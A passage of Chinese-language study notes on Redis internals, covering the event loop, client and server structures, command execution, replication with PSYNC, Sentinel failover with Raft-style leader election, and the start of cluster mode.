服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。

事件的调度和执行由`ae.c/aeProcessEvents`函数负责：

```python
def aeProcessEvents():
	# 获取到达时间离当前时间最接近的时间事件
    time_event = aeSearchNearestTimer()
    # 计算最接近的时间事件距离到达还有多少毫秒
    remaind_ms = time_event.when - unix_ts_now()
    # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0
    if remaind_ms < 0:
        remaind_ms = 0
    # 根据 remaind_ms 的值，创建 timeval
    timeval = create_timeval_with_ms(remaind_ms)
    # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定
    aeApiPoll(timeval)
    # 处理所有已产生的文件事件，事实上这个部分是直接写在这个函数里面的
    procesFileEvents()
    # 处理所有已到达的时间事件
    processTimeEvents()
```

将`aeProcessEvents`函数置于一个循环之中，加上初始化和清理函数，就构成了redis的服务器的主函数。

```python
def main():
	# 初始化服务器
	init_server()
	# 一直处理事件，直到服务器关闭
	while server_is_not_shutdown():
		aeProcessEvents()
	# 服务器关闭，执行清理操作
	clean_server()
```

#### 事件的调度和执行规则

- `aeApiPoll`函数的最大阻塞时间由到达时间最接近当前时间的时间事件决定，这种方法既可以避免服务器对时间事件进行频繁的轮询，也可以确保`aeApiPoll`函数不会阻塞过长时间。
- 时间事件到达时间之前，一直处理到达的文件事件。
- 对文件事件和时间事件的处理都是同步、有序、原子的执行的，服务器不会中途中断事件处理，也不会对事件进行抢占。因此两种事件都应当尽量减少程序的阻塞时间。
- 因为时间事件在文件事件之后处理，并且事件之间不会出现抢占，所以时间事件的处理时间通常会比设定时间晚一些。

## Redis客户端

Redis服务器是一个典型的一对多服务器程序：一个服务器可以与多个客户端建立网络连接，每个客户端可以向服务器发送命令请求，而服务器则接收并处理客户端发送的命令请求，并向客户端返回命令回复。

通多使用由IO多路复用技术实现的文件事件处理器，redis服务器使用单线程单进程的方式来处理命令请求，并于多个客户端进行网络通信。

对于每个域服务器进行连接的客户端，服务器都为这些客户端建立了相应的`server.h/client`结构。主要内容有：

```c
struct client{
	int fd;			// 客户端描述字
    robj *name;		// 客户端名字
	sds querybuf;	// 客户端请求缓存
	int argc;
	robj **argv;	// 当前命令
    struct redisCommand *cmd;
	redisDb *db;	// 指向当前选中的数据库的指针
	int flags;		// 客户端的标志值
	list *reply;	// 返回给客户端的对象
	char buf[PROTP_REPLY_CHUNK_BYTES];		// 固定长度输出缓冲区
    int bufpos;		// 记录输出缓冲区输出目前已经使用的字节数量
    list *reply;	// 可变大小输出缓冲区
	...
}
```

### 客户端属性

- 通用属性，很少与特定功能有关，无论客户端执行的是什么工作都需要这些属性
- 和特定功能相关的属性，比如操作数据库需要用到的db属性和dictid属性

#### 套接字描述符

- 伪客户端的fd属性值为-1：伪客户端处理的命令请求来源于AOF文件或者LUA脚本，而不是网络，所以不需要套接字连接。目前两个地方用到伪客户端：一个用于载入AOF文件并还原数据库状态，一个用于执行Lua脚本包含的redis命令。
- 普通客户端的fd属性值为大于-1的整数

#### 名字

一般情况下客户端是没有名字的，但是为了让客户端的身份清晰，可以使用`CLIENT setname`命令为客户端设置名字

#### 标志值

记录了客户端的角色（role），以及客户端所处的状态。

- 在复制操作时，主服务器会成为从服务器的客户端，从服务器也是主服务器的客户端，主服务器标志值为`REDIS_MASTER`，从服务器标志值为`REDIS_SLAVE`
- `REDIS_LUA_CLIENT`表示仅为处理Lua脚本命令的伪客户端
- `REDIS_UNIX_SOCKET`表示服务器使用UNIX套接字来连接客户端

#### 输入缓冲区

客户端状态的输入缓冲区用于保存客户端发送的命令请求。

输入缓冲区的大小会根据输入内容动态的缩小或者扩大，但是不能超过1G，否则服务器会关闭这个客户端。

#### 命令参数

服务器将客户端发送的命令请求保存到输入缓冲区之后，会对命令请求的内容进行分析，并将得到的命令参数以及命令参数的个数分别保存到客户端状态的argv属性和argc属性。

- `argv`是一个数组，数组中的每个项都是一个字符串对象，其中argv[0]是要执行的命令，之后的其他项是传给命令的参数
- `argc`负责记录argv数组的长度

#### 命令的实现函数

`struct redisCommand *cmd`：服务器从协议内容分析得到argv和argc属性后，服务器将根据项argv[0]的值，在命令表中查找命令所对应的命令实现函数。

#### 输出缓冲区

执行命令得到的命令回复会被保存在客户端状态的输出缓冲区里，每个客户端都有两个输出缓冲区可用，一个的大小是固定的，一个大小是可变的。

- 固定大小的缓冲区用于保存长度较小的回复，默认值为16*1024（16KB）
- 可变大小的缓冲区用于保存那些长度比较长的回复，使用reply链表和一个或者多个字符串对象组成

#### 身份验证

客户端状态中的`authenticated`属性记录客户端是否通过了身份验证，如果为0表示未通过身份验证，为1表示通过

- 当属性值为0时，除了`AUTH`命令之外，客户端的其他命令都会被服务器拒绝执行
- 该属性仅在服务器启用了身份验证功能时使用

#### 时间

```c
time_t ctime;			// 客户端创建的时间
time_t lastinteraction;	// 最后一次互动的时间
time_t obuf_soft_limit_reached_time;	// 客户端的空转时间，也即距离最后一次互动过去了多久
```

### 客户端的创建与关闭

#### 普通客户端

连接：通过网络连接和服务器进行连接的客户端，在客户端使用`connect`函数连接到服务器时，服务器会调用连接事件的处理器，并为客户端创建相应的客户端状态，并将这个客户端状态添加到服务器状态结构clients链表的结尾。

关闭：

- 客户端进程退出或者被杀死，客户端与服务器的网络连接被关闭，此时客户端关闭
- 客户端向服务器发送了带有不符合协议格式的命令请求，也会被关闭
- 客户端成为`CLIENT KILL`命令的目标，会被关闭
- 服务器设置了`timeout`选项，那么客户端的空转时间超过这个值，会被关闭
- 客户端发送的命令请求超过了输入缓冲区大小，会被关闭
- 发送给客户端的命令回复的大小超过输出缓冲区大小，会被关闭
  - 理论上有了可变输出缓冲区，该缓冲区大小可以保存任意长的回复，但是为了避免客户端回复过大，服务器会检查客户端的输出缓冲区的大小，使用两种方式限制客户端输出缓冲区的大小
    - 硬性限制：如果输出缓冲区大小超过了硬性限制所设置的大小，那么服务器会立即关闭客户端
    - 软性限制：如果输出缓冲区大小超过了软性限制所设置的大小，但是还没超过硬性限制大小，那么服务器使用`obuf_soft_limit_reached_time`属性记录客户端到达软性限制的起始时间，如果该属性持续超过服务器设定时长，客户端会被关闭；否则该值清零

#### Lua伪客户端

服务器在**初始化时会创建**负责执行lua脚本中包含的redis命令的伪客户端，并将这个伪客户端关联在服务器状态结构的`lua_client`属性中，伪客户端在服务器运行的**整个生命周期都是存在的**。

**AOF文件的伪客户端：**服务器在载入AOF文件时，会创建用于执行AOF文件包含的reids命令的伪客户端，并在载入完成之后，关闭这个伪客户端。

## Redis服务器

Redis服务器负责与多个客户端建立网络连接，处理客户端发送的命令请求，在数据库中保存客户端执行命令产生的数据，并通过资源管理来维持服务器自身的运转。

### 命令请求的执行过程

例：`SET KEY VALUE --->OK`

- 客户端向服务器发送命令请求`SET KEY VALUE`
- 服务器接收并处理客户端发送的命令请求，在数据库中进行设置操作，并产生命令回复OK
- 服务器将命令回复OK发送给客户端
- 客户端接收到回复，并显示出来

#### 发送命令请求

- 用户键入命令请求
- 客户端转换为协议格式
- 通过连接到服务器套接字将协议格式命令请求发送给服务器
- 例如`SET KEY VALUE`转换为协议格式`*3\r\n$3\r\nSET\r\n$3\r\nKEY\r\n$5\r\nVALUE\r\n`

#### 读取命令请求

当连接套接字因为客户端的写入而变得可读时，服务器调用命令请求处理器来执行以下操作：

- 读取套接字中协议格式的命令请求，并将其保存到客户端状态的输入缓冲区里
- 对输入缓冲区中的命令请求进行分析，提取出命令请求中包含的命令参数，以及命令参数的个数，然后分别将参数和参数个数保存在argv和argc属性中
- 调用命令执行器，执行客户端指定的命令

#### 命令执行器

```c
struct redisCommand{
	char *name;				// 命令名称，比如"SET"
	// typedef void redisCommandProc(client *c)
	redisCommandProc *proc;	// 函数指针，指向命令的实现函数，比如setCommand
	int arity;				// 命令参数的个数，用于检查命令请求是否正确。如果该值为-N，标识参数数量大于等于N
	char *sflags;			// 字符串形式的标识值，这个值记录了命令的属性
	uint64_t flags;			// 对标识分析得到的二进制标识
	long long microseconds, calls;	// 执行命令耗费的总时长，总共执行了多少次这个命令
};
```

```
// sflags
w		// 写入命令，可能会修改数据库，				比如SET, RPUSH, DEL等
r		// 只读命令，不会修改，						比如GET, STRLEN, EXISTS等
m		// 该命令会占用大量内存，执行前先检查内存情况，	比如SET, APPEND,RPUSH等
a		// 管理命令									比如SAVE，BGSAVE等
```

例如：SET命令的名字为"set"，实现函数为`setCommand`，参数个数为-3；标识为"`wm`"

程序对输入的`argv[0]`，在命令表中进行查找，命令表返回`argv[0]`对应的`redisCommand`结构，**客户端状态的cmd指针会指向这个结构**。

**执行预备操作：**

- 检查客户端状态的cmd指针是否指向NULL，如果是则向客户端返回一个错误
- 根据客户端cmd属性指向的redisCommand结构的arity属性，检查命令请求所给定的参数个数是否正确，如果不正确，返回错误
- 检查客户端是否通过身份验证
- 如果服务器打开了maxmemory功能，那么在执行命令之前，先检查服务器的内存占用情况，并在有需要时进行回收，如果内存回收失败，返回错误
- 如果服务器上次BGSAVE命令出错，并且服务器打开了`stop-writes-on-bgsave-error`，而且服务器将要执行的是一个写命令，那么服务器拒绝执行这个命令，并返回错误
- 如果客户端正在用SUBSCRIBE命令订阅频道，或者正在用PSUBSCRIBE命令，那么服务器只会执行客户端发来的订阅相关的命令，其他命令会被拒绝。
- ...

**调用命令的实现函数**

`client->cmd->proc(client)`，被调用的命令实现函数会执行指定的操作，并产生相应的命令回复，这些回复会被保存在客户端状态的输出缓冲区里，之后实现函数还会为客户端的套接字关联命令回复处理器，负责后续回复操作。

**执行后续操作**

实现函数执行完后，还会执行一些后续操作：

- 如果服务器开启了慢查询日志功能，那么慢查询日志模块会检查是否需要为刚执行完的命令请求添加一条新的慢查询日志
- 根据执行命令耗费的时长，更新被执行命令的redisCommand结构的milliseconds属性，并将calls属性值加1
- 如果服务器开启了AOF持久化，将刚执行的命令请求写入到AOF缓冲区里
- 如果有其他从服务器正在复制当前服务器，那么服务器会将刚执行的命令传播给其他服务器

**将命令回复给客户端**

关联命令回复处理器后，当客户端套接字变为可写状态时，服务器会执行命令回复处理器，将保存在客户端输出缓冲区中的命令回复发送给客户端。

当发送完成后，回复处理器会清空客户端状态的输出缓冲区，为处理下一个命令请求做好准备。

### serverCron函数

该函数默认每个100ms执行一次，负责管理服务器的资源，并保持服务器自身的良好运转。

#### 更新服务器时间缓存

服务器状态中的`unixtime`和`mstime`属性被用作当前时间的缓存。由于每100ms更新一次，所以该时间精度不高

- 只会在打印日志，更新服务器的LRU时钟，决定是否执行持久化任务，计算服务器上线时间这些对精度要求不高的功能上
- 对于为键设置过期时间，添加慢查询日志这种需要高精度的功能来说还是需要每次执行系统调用

#### 更新LRU时钟

服务器状态中的`lruclock`属性保存了服务器的LRU时钟，也是服务器时间缓存的一种。

当服务器要计算一个数据库键的空转时间，程序会使用服务器的`lruclock`属性记录的时间减去对象的`lru`属性记录的时间，得出的结果就是这个对象的空转时间。

#### 更新服务器每秒执行命令次数

`trackInstantaneousMetric`函数以每100ms一次的频率执行，这个函数的功能是以抽样计算的形式，估算并记录服务器在最近一秒钟处理的命令请求数量。估算值

#### 更新服务器内存峰值记录

服务器状态中的`stat_peak_memory`属性记录了服务器的内存峰值大小。更新最大值

#### 处理SIGTERM信号

启动服务器时，Redis会为服务器进行的SIGTERM信号关联处理器`sigtermHandler`函数，这个信号处理器负责在服务器接收到SIGTERM信号时，打开服务器状态的`shutdown_asap`标识。

每次根据该标识决定是否关闭服务器。关闭之前会进行RDB持久化操作。

#### 管理客户端资源

每次执行都会调用`clientsCron`函数，会对一定数量的客户端进行以下两个检查

- 如果客户端与服务器之间连接已经超时，那么程序释放该客户端
- 如果客户端在上一次的请求之后，输入缓冲区的大小超过了一定的长度，那么程序 会释放客户端当前的输入缓冲区，并重新创建一个默认大小的输入缓冲区，从而防止客户端的输入缓冲区耗费过多的内存。

#### 管理数据库资源

内次执行都会调用`databsesCron`函数，对服务器中一部分数据库进行操作，删除其中的过期键，并在有需要时，对字典进行收缩操作。

#### 执行被延迟的BGREWRITEAOF

在服务器执行BGSAVE命令的期间，如果客户端向服务器发来BGREWRITEAOF命令，那么服务器会将BGREWRITEAOF命令的执行时间延迟到BGSAVE命令执行完毕之后。

服务器状态的`aof_rewrite_scheduled`标识记录了服务器是否延迟了该命令。

#### 检查持久化操作的运行状态

服务器状态使用`rdb_child_pid`和`aof_child_pid`属性记录执行BGSAVE命令和BGREWRITEAOF命令的子进程pid，这两个属性可以用于检查这两个命令是否正在执行。

- `rdb_child_pid`：如果服务器没有在执行BGSAVE，该值为-1
- `aof_child_pid`：如果服务器没有在执行BGREWRITEAOF，该值为-1

![image-20200802120117282](..\assets\post\others\chijiuhua.png)

#### 将AOF缓冲区内容写入到AOF文件

如果开启了AOF持久化，并且AOF缓冲区内还有待写入的数据，那么此时将AOF缓冲区中的内容写入到AOF文件里面。

#### 关闭异步客户端

服务器会关闭那些输出缓冲区大小超出限制的客户端

#### 增加cronloops计数器的值

`cronloops`属性的唯一作用就是在复制模块中实现“每执行serverCron函数N次就执行一次指定代码”的功能

### 初始化服务器

- 初始化服务器状态结构，即初始化一些默认属性比如运行ID、默认运行频率、默认配置文件路径、运行架构、默认端口号、创建命令表等。
- 载入配置选项，如果用户为启动指定了配置文件，就使用配置文件中指定的值初始化服务器
- 初始化服务器数据结构，包括`clients`链表，`db`数组，`server.pubsub_channels`字典，`server.lua`，`server.slowlog`慢查询日志属性。
- 还为服务器设置进程信号处理器，创建共享对象（包含redis服务器经常用到的一些值，比如包含“OK”回复的字符串），打开服务器的监听端口，并为监听套接字关联连接应答事件处理器，等待服务器正式运行时接受客户端的连接。
  - 并为serverCron函数创建时间事件，等待服务器正式运行时执行serverCron函数。
  - 如果AOF持久化功能已经打开，那么打开现有的AOF文件，如果AOF文件不存在，那么创建并打开一个AOF文件
  - 初始化服务器的后台IO模块，为将来的IO操作做好准备。

#### 还原数据库状态

完成了服务器状态server的初始化之后，服务器需要载入rdb文件或者aof文件，并根据文件内容还原数据库的状态。

- 如果开启了该功能，那么服务器使用AOF文件来还原数据库状态
- 否则使用RDB文件

#### 执行事件循环

初始化的最后一步，服务器打印准备好进行连接之后开始执行服务器的事件循环（loop）

## Redis复制

Redis中，可以通过执行`SLAVEOF`命令或者设置`slaveof`选项，让一个服务器去复制（replicate）另一个服务器，被复制的称为主服务器（master），进行复制的被称为从服务器（slave）。

Redis的复制功能分为两个操作：同步（sync）和命令传播（command propagate）：

- 同步操作用于将从服务器的数据库状态更新至主服务器当前所处的数据库状态
- 命令传播用于在主服务器的数据库状态被修改，导致主从服务器的数据库状态出现不一致，让主从服务器的数据库重新回到一直状态。

### SYNC

- 从服务器向主服务器发送SYNC命令
- 收到SYNC命令的主服务器执行BGSAVE命令，在后台生成一个RDB文件，并使用一个缓冲区记录从现在开始执行的所有写命令。
- 当主服务器的BGSAVE命令执行完毕，主服务器会将生成的RDB文件发送给从服务器，从服务器载入这个文件，将自己的数据库更新至主服务器执行BGSAVE时的数据库状态
- 主服务器将记录在缓冲区里面的所有写命令发送给从服务器，从服务器执行这些命令将自身状态更新到主服务器当前状态。

SYNC是一个非常耗费资源的操作：

- 生成RDB文件会耗费大量的CPU、内存和磁盘IO资源
- 传送RDB文件给从服务器会耗费主从服务器上的大量网络资源，并对主服务器响应命令请求的时间产生影响
- 从服务器载入RDB文件会因为阻塞而无法处理命令请求。

### 命令传播

主服务器将自己执行的写命令，发送给从服务器执行，这样可以保持一致状态。

### PSYNC

为了解决旧版复制功能在处理断线重复情况时的**低效问题**，Redis使用PSYNC命令代替SYNC命令来执行复制时的同步操作。

PSYNC命令具有完整重同步（full resynchronization）和部分重同步（partial resynchronization）两种模式：

- 完整重同步用于处理初次复制情况：完整重同步的执行步骤和SYNC命令的执行步骤基本一样，都是通过让主服务器创建并发送RDB文件，以及向服务器发送保存在缓冲区里面的写命令来进行同步。
- 部分重同步则用于处理短线后重复制情况：当服务器在断线后重新连接主服务器时，如果条件允许，主服务器可以将主服务器连接断开期间执行的写命令发送给从服务器，从服务器只要接收并执行这些写命令，就可以将数据库更新到主服务器当前所处的状态。

#### 部分重同步的实现

有三个部分构成：

- 主服务器的复制偏移量（replication offset）和从服务器的复制偏移量
- 主服务器的复制积压缓冲区（replication backlog）
- 服务器运行ID（run ID）

**复制偏移量**

执行复制的双方——主服务器和从服务器会分别维护一个复制偏移量：

- 主服务器每次向从服务器传播N个字节的数据时，就将自己的复制偏移量的值加上N
- 从服务器每次收到主服务器传播来的N个字节的数据时，就将自己的复制偏移量的值加N

通过对比复制偏移量，可以很容易的知道主从服务器是否处于一致状态。

**复制积压缓冲区**

复制积压缓冲区是由主服务器维护的一个**固定长度（fixed-size）先进先出（FIFO）**队列，默认大小为1MB。

当主服务器进行命令传播时，它不仅会将写命令发送给所有从服务器，还会将写命令入队到复制积压缓冲区里。

当从服务器重新连接到主服务器时，从服务区会通过PSYNC命令将自己的复制偏移量offset发送给主服务器，主服务器会根据这个偏移量来决定服务器进行何种同步操作：

- 如果offset还在缓冲区里面，执行部分重同步，否则完全重同步

复制积压缓冲区的大小可以用second*write_size_per_second来估算。

**服务器运行ID**

每个Redis服务器，不论是主服务器还是从服务器，都会有自己的运行ID

运行ID在服务器启动时自动生成，由40个随机的16进制字符组成。

从服务器对主服务器进行初次复制时，主服务器会将自己的运行ID发送给从服务器，从从服务器会将这个运行ID保存起来。

当从服务器断线并重新连接这个主服务器，从服务器将向当前连接的主服务器发送之前保存的运行ID；如果一致尝试执行部分重同步，如果不一致执行完整重同步操作。

#### PSYNC命令实现

如果从服务器从来没有复制过任何主服务器，或者之前执行过SLAVEOF no one命令，那么从服务器在开始一次新的复制时发送`PSYNC ? -1`命令，主动请求主服务器进行完整重同步。

![image-20200803142244142](..\assets\post\others\psync.png)

### 复制的实现

通过向从服务器发送`SLAVEOF`命令，可以让一个从服务器去复制一个主服务器：

`SLAVEOF <master_ip> <master_port>`

复制功能实现的主要步骤：

- 设置主服务器的地址和端口
  - 从服务器收到客户端的命令之后将IP和端口保存到服务器状态的`masterhost`和`masterport`属性里。
  - SLAVEOF是一个异步命令，设置完成服务器状态属性之后，从服务器返回OK，实际的复制工作之后完成
- 建立套接字连接：从服务器根据命令所设置的IP地址和端口创建连向主服务器的套接字连接。
  - 从服务器创建的套接字能成功连接（connect）到主服务器，那么从服务器将为这个套接字关联到一个专门用于处理复制工作的文件事件处理器，负责后续的复制工作。
  - 主服务器在接受（accept）从服务器的套接字连接之后，为该套接字创建相应的客户端状态，并将从服务器看作是一个连接到主服务器的客户端看待（**即从服务器是主服务器的客户端**）
- 发送PING命令：连接成功之后从服务器向主服务器发送一个PING命令

![image-20200803145247549](..\assets\post\others\copyping.png)

- 身份验证
  - 如果从服务器设置了`masterauth`选项，就进行身份验证；反之不进行身份验证
  - 在需要进行身份验证的情况下，从服务器向主服务器发送一条AUTH命令，命令的参数为从服务器`masterauth`选项的值

![image-20200803145722958](..\assets\post\others\copyauth.png)

- 发送端口信息
  - 身份验证之后，从服务器执行`REPLCONF listening-port <port-number>`，向主服务器发送从服务器的监听端口号。
  - 主服务器收到这个端口，将其设置在客户端状态中的`slave_listening_port`属性中
  - 目前该属性唯一的作用是在主服务器执行`INFO replication`命令时输出端口号
- 同步：从服务器向主服务器发送PSYNC命令，执行同步操作，并将自己的数据库更新至主服务器数据库当前所处的状态
  - 注意：在同步操作执行之前，只有从服务器是主服务器的客户端，但是在执行之后，主服务器也会变成从服务器的客户端
- 命令传播：主服务器只要一直系那个自己执行的写命令发送给从服务器，从服务器一直接收并执行写命令就可以实现同步了
  - 心跳检测：在命令传播阶段，从服务器默认每秒一次的频率向主服务器发送命令`REPLCONF ACK <replication_offset>`，参数为从服务器当前的偏移量，主要用来实现
    - 检测主从服务器的网络连接状态
    - 辅助实现min-slaves选项
    - 检测命令丢失

## Redis哨兵（Sentinel）

Sentinel（哨兵）是Redis的高可用性解决方案：有一个或者多个Sentinel实例组成的Sentinel系统可以监视任意多个主服务器，以及这些主服务器属下的所有从服务器，自动将下线主服务器属下的某个从服务器**升级为主服务器**，然后由新的主服务器代替下线的主服务器继续处理命令请求；并发送命令将余下的从服务器转转化为当前主服务器的从服务器。

当下线的主服务器重新上线之后，自动将其设置为当前主服务器的从服务器。

Sentinel本质就是一个运行在特殊模式下的Redis服务器。

### 启动并初始化Sentinel

`redis-sentinel <conf file path>`

#### 初始化服务器

- Sentinel本质上就是一个运行在特殊模式下的Redis服务器，所以首先初始化一个普通的Redis服务器
- 但Sentinel的服务器与普通服务器并不相同

![image-20200803153109982](..\assets\post\others\sentinelfunc.png)

#### 使用sentinel专用代码

- 将一部分普通Redis服务器使用的代码替换成Sentinel专用代码。
  - 例如Sentinel使用的端口号为26379，普通服务器使用的是6379
  - Sentinel使用的命令表为`sentinel.c/sentinelcmds`，普通服务器使用的是`server.c/redisCommandTable`

#### 初始化Sentinel状态

服务器初始化一个`sentinel.c/sentinelState`结构（称为Sentinel状态），这个结构保存了服务器所有和Sentinel功能有关的状态。

```c
struct sentinelState{
	dict *masters;		// 字典的键是主服务器的名字，值是一个指向sentinelRedisInstance结构的指针
    ...
}sentinel;
```

#### 初始化Sentinel状态的masters属性

Sentinel状态中的masters字典记录了所有被Sentinel监视的主服务器的相关信息，其中：

- 字典的键是被监视主服务器的名字
- 字典的值是被监视主服务器对应的`sentinel.c/sentinelRedisInstance`结构，每个该结构代表一个被Sentinel监视的Redis服务器实例，这个实例可以是主服务器、从服务器，或者是另一个Sentinel

masters字典的初始化是根据Sentinel配置文件来进行的。

#### 创建连向主服务器的网络连接

初始化的最后一步是创建连向主服务器的网络连接，Sentinel将称为主服务器的客户端，可以向主服务器发送命令，并从命令回复中获取相关的信息。

对于每个被Sentinel监视的主服务器来说，Sentinel会创建两个连向主服务器的异步网络连接：

- 一个是命令连接，这个连接专门用于向主服务器发送命令，并接收命令回复
- 一个是订阅连接，专门用来订阅主服务器的`__sentinel__:hello`频道

### 获取主服务器信息

Sentinel默认以每10秒一次的频率，通过命令连接向被监视的主服务器发送INFO命令，并通过分析INFO命令的回复来获取主服务器的当前信息。信息中一部分是主服务器自身的信息；另一部分是主服务器属下所有的从服务器的信息。

```c
# Server
...
run_id:xxxxxxx(40位)
...
# Replication
role:master
...
slave0:ip=xxx,port=xxx,state=online,offset=xx,lag=0
slave1:ip=xxx,port=xxx,state=online,offset=xx,lag=0
...
# Other Sections
...
```

### 获取从服务器信息

当Sentinel发现主服务器有新的从服务器出现时，Sentinel除了会对这个新的从服务器进行相应的实例结构之外，Sentinel还会创建连接到这个从服务器的命令连接和订阅连接。

```
# Server
...
run_id:xxxxx
...
# Replication
role:slave
master_host:xxx
master_port:xxx
master_link_status:up	// 主从服务器连接状态
slave_repl_offset:xxx	// 从服务器复制偏移量
slave_priority:100		// 优先级
# Other Sections
...
```

### 向主从服务器发送信息

默认情况下，Sentinel会以每2秒一次的频率通过**命令连接**向所有被监视的服务器发送以下格式的命令：

`PUBLISH __sentinel__:hello "<s_ip>,<s_port>,<s_runid>,<s_epoch>,<m_name>,<m_ip>,<m_epoch>"`

其中s开头的信息为Sentinel本身的信息，m开头的信息为主服务器的信息。

### 接收来自主从服务器的频道信息

当Sentinel与一个主服务器或者从服务器建立起订阅连接之后，Sentinel就会通过**订阅连接**，向服务器发送以下命令：

`SUBSCRIBE __sentinel__:hello`

Sentinel对`__sentinel__:hello`频道的订阅会一直持续到Sentinel与服务器连接断开为止。也就是说，对于每个和sentinel连接的服务器，Sentinel既可以通过**命令连接**向服务器的`__sentinel__:hello`频道发送信息，也可以通过**订阅连接**从服务器的`__sentinel__:hello`频道接收信息。

对于同监视同一个服务器的多个Sentinel来说，一个Sentinel发送的信息会被其他Sentinel接收到，这些信息会被用于更新其他Sentinel对发送信息Sentinel的互相认知。

#### 更新sentinels字典

Sentinel为主服务器创建的实例结构中的sentinels字典保存了除Sentinel本身之外，其他监视该主服务器的Sentinel的资料。

- 键为其他Sentinel的名字，一般为IP:PORT
- 值为对应的Sentinel的实例结构

当一个Sentinel接收到其他Sentinel发来的信息时，目标Sentinel会从信息中分析并提取出一些参数：

- 与Sentinel有关的参数如源Sentinel的IP地址，端口号，运行ID和配置纪元
- 与主服务器有关的参数如源Sentinel正在监听的主服务器的名字，IP地址，端口号和配置纪元

根据提取出的主服务器参数，目标Sentinel会在自己的状态的masters字典中查找相应的主服务器实例结构，然后根据提取出的Sentinel参数检查主服务器实例结构中的sentinels字典，然后创建新实例结构或者更新实例。

### 检查主观下线状态

默认情况下，Sentinel以每秒一次的频率向与他创建了连接的所有实例发送PING命令，根据距上次有效返回的时间是否进入主观下线的时间长度判断主观下线状态，并打开该实例状态里的`flags`属性中的`SRI_S_DOWN`标识。

### 检查客观下线状态

当Sentinel将一个主服务器判断为主观下线后，为了确认这个主服务器是否真的下线，他会同样监视这个主服务器的其他Sentinel进行询问，当Sentinel从其他Sentinel那里接收到足够数量（启动时设置的参数）的已下线判断之后，Sentinel就会判定为客观下线，并进行故障转移操作。

`SENTINEL is-master-down-by-addr <ip> <port> <current_epoch> <runid>`

Sentinel收到该命令会对命令进行解析，并返回目标服务器的在线状态

### 选举领头Sentinel（Raft）

领头Sentinel用于对主服务器进行故障转移。

- Raft协议描述的节点共有三种状态：Leader, Follower, Candidate。

- 在系统运行正常的时候只有Leader和Follower两种状态的节点。一个Leader节点，其他的节点都是Follower。

- Candidate是系统运行不稳定时期的中间状态，当一个Follower对Leader的的心跳出现异常，就会转变成Candidate，Candidate会去竞选新的Leader，它会向其他节点发送竞选投票，如果大多数节点都投票给它，它就会替代原来的Leader，变成新的Leader，原来的Leader会降级成Follower。

#### Raft选举流程

- 增加自己的epoch
- 启动一个新的定时器（随机超时时间，随机选取配置时间的1到2倍之间。所以先成为candidate的更有机会成为leader）
- 给自己投一票
- 向所有节点发送RequestVote，并等待其他节点的回复。在这期间如果收到其他节点发送的AppendEntries就说明有leader产生了，自己转换为Follower，选举结束。
- 如果在计时器超时前，节点收到多数节点（N/2+1）的同意投票，就转换为Leader，同时向所有的其他节点发送AppendEntries，告知自己成为了leader。
- 如果所有candidate都没有拿到多数票，那么等计时器超时后重新成为candidate，重复选举流程。

#### Sentinel选举流程

当需要故障转移的时候会在sentinel集群中选举出一个leader执行故障转移操作。Sentinel使用了Raft协议实现Sentinel间选举leader的算法。Sentinel集群运行过程中故障转移完成，所有Sentinel又会恢复平等。Leader仅仅是故障转移时出现的角色。

- 某个Sentinel认定master客观下线后，会检查自己有没有投过票，如果已经投过，在2倍的故障转移超时时间内不会成为leader。
- 如果未投过票，就成为Candidate
- 以下进入Raft流程
  - 更新故障转移状态开始
  - 当前epoch+1，更新自己的超时时间未当前时间加1s内的随机毫秒数
  - 向其他节点发送`is-master-down-by-addr`命令请求选票，并带上自己的epoch
  - 给自己投一票，在sentinel中，**给自己投票的方式是把自己master结构体中的leader和leader_epoch改成投给的sentinel和它的epoch**
- 其他sentinel收到Candidate发送的`is-master-down-by-addr`命令，如果Sentinel当前epoch和Candidate传给他的epoch一样，说明它已经给别的candidate投过票，投过票的Sentinel在当前epoch内只能成为follower。
- Candidate会不断统计自己的票数，如果发现票数超过一半并且超过配置的quorum就成为Leader
- 如果在一个选举时间内，candidate没有获得一半且超过quorum的票数，则选举失败；等待超过2倍故障转移的超时时间后，重新开始选举流程。
- 与Raft不同，Leader不会把自己称为Leader的消息发给其他Sentinel。其他Sentinel等待leader选出master后，检测到新的master正常工作后，就会去掉客观下线的标志，从而不需要进入故障转移流程。

### 故障转移

#### 选出新的主服务器

- 在已下线主服务器属下的所有从服务器里，选择一个从服务器并将其设置为主服务器
  - 将所有从服务器保存在一个列表里，删除处于下线或者短线的，删除最近5秒内没有回复过领头Sentinel的INFO命令的，删除
- 让已下线主服务器属下的所有从服务器改为复制新的主服务器
- 将已下线主服务器设置为新的主服务器的从服务器，当旧主服务器重新上线后，会自动改变角色

选择完成后，领头Sentinel向被选中的从服务器发送`SLAVEOF no one`命令，之后以一秒一次的频率向被升级的从服务器发送INFO命令，观察命令回复的角色信息。

#### 修改从服务器的复制目标

向其他从服务器发送`SLAVEOF <ip> <port>`命令。

#### 将旧主服务器变为从服务器

在旧主服务器实例中的角色属性将其转换为从服务器，在它重新上线后，向他发送`SLAVEOF`命令。

## Redis集群(16384(2^14))

Redis集群是Redis提供的分布式数据库方案，集群通过分片（sharding）来进行数据共享，并提供复制和故障转移功能。

### 节点

一个Redis集群有多个**节点（node）**组成。使用`CLUSTER MEET`命令连接各个节点：

`CLUSTER MEET <ip> <port>`

向一个节点发送以上命令，可以让该节点同ip和port所指定的节点进行握手，握手成功之后，该节点就会将指定节点添加到该节点所在的集群中。

#### 启动节点

一个节点就是一个运行在集群模式下的Redis服务器，Redis服务器在启动时会根据`cluster-enabled`配置选项是否为yes来决定是否开启服务器的集群模式。

节点会继续使用所有在单机模式下使用的服务器组件，比如文件事件处理器，时间事件处理器，RDB和AOF持久化等。

其中serverCron函数会调用集群模式特有的clusterCron函数，该函数会执行在集群模式下需要执行的常规操作。比如向集群中的其他节点发送Gossip消息，检查节点是否断线等。

节点还使用`cluster.h/clusterNode,clusterLink,clusterState `结构保存集群模式状态。

#### 集群数据结构

每个节点都会使用一个clusterNode结构来保存自己的状态，比如节点创建时间，节点名字，节点IP地址和端口等，并为集群中的所有其他节点（包括主节点和从节点）都创建一个相应的clusterNode结构。

clusterNode结构中的link属性是一个clusterLink结构，该结构保存了连接节点所需要的有关信息，比如套接字描述符，输入输出缓冲区等。

clusterState结构记录了当前节点的视角下，集群目前所处的状态，比如集群是在线还是下线，集群包含了多少节点，集群目前的配置纪元等

